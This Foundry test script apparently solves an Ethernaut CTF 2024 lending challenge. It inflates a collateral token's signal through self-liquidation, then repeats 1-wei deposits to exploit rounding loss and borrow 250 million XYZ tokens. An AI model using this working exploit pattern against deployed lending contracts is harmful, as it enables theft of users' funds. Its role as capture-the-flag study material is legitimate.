// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/EthernautCTF_2024/XYZ/Challenge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Challenge challenge;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(attacker, 1 ether);

        Token sETH = new Token(deployer, "sETH");
        Manager manager = new Manager();
        Token XYZ = manager.xyz();
        challenge = new Challenge(XYZ, sETH, manager);
        manager.addCollateralToken(IERC20(address(sETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);

        sETH.mint(deployer, 2 ether);
        sETH.approve(address(manager), type(uint256).max);
        manager.manage(sETH, 2 ether, true, 3395 ether, true);  // 2 sETH -> 3395.4 XYZ

        (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(sETH)));
        // console2.log(debtToken.balanceOf(deployer));
        manager.updateSignal(debtToken, 3520 ether);   // make deployer unhealthy
        // console2.log(debtToken.balanceOf(deployer));

        sETH.mint(attacker, 6000 ether);  // 6000 * (2207 / 1.3) -> 10_186_153 XYZ 

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", challenge.isSolved());

        vm.stopPrank();
    }

    function solve() public {
        Token sETH = challenge.seth();
        Token xyz = challenge.xyz();
        Manager manager = challenge.manager();
        emit log_named_decimal_uint("sETH", sETH.balanceOf(attacker), sETH.decimals());

        (ERC20Signal collateralToken, ERC20Signal debtToken, PriceFeed feed,,) = manager.collateralData(IERC20(address(sETH)));
        console2.log("signal", collateralToken.signal());

        // 1. make signal of CollateralToken very large
        sETH.approve(address(challenge.manager()), type(uint256).max);
        manager.manage(sETH, 3 ether, true, 4000 ether, true);   // borrow first
        emit log_named_decimal_uint("collateralToken", collateralToken.balanceOf(attacker), collateralToken.decimals());
        sETH.transfer(address(manager), sETH.balanceOf(attacker));  // transfer all sETH to manager
        manager.liquidate(sETH.manager());
        console2.log("signal", collateralToken.signal());
        emit log_named_decimal_uint("sETH", sETH.balanceOf(attacker), sETH.decimals());

        // 2. presicion loss
        emit log_named_decimal_uint("collateralToken", collateralToken.balanceOf(attacker), collateralToken.decimals());
        uint256 eachTime = collateralToken.signal() / 1 ether;
        emit log_named_decimal_uint("collateral increase each time", eachTime, collateralToken.decimals());
        while (collateralToken.balanceOf(attacker) / 1 ether < 147318 ) { // 250_000_000 / 1697
            manager.manage(sETH, 1, true, 0, true); 
        }
        emit log_named_decimal_uint("collateralToken", collateralToken.balanceOf(attacker), collateralToken.decimals());

        // 3. get XYZ token
        manager.manage(sETH, 0, false, 250_000_000 ether, true);
        emit log_named_decimal_uint("XYZ balance", xyz.balanceOf(attacker), xyz.decimals());

        // 4. transfer XYZ to 0xCAFEBABE
        xyz.transfer(address(0xCAFEBABE), 250_000_000 ether);
    }
}


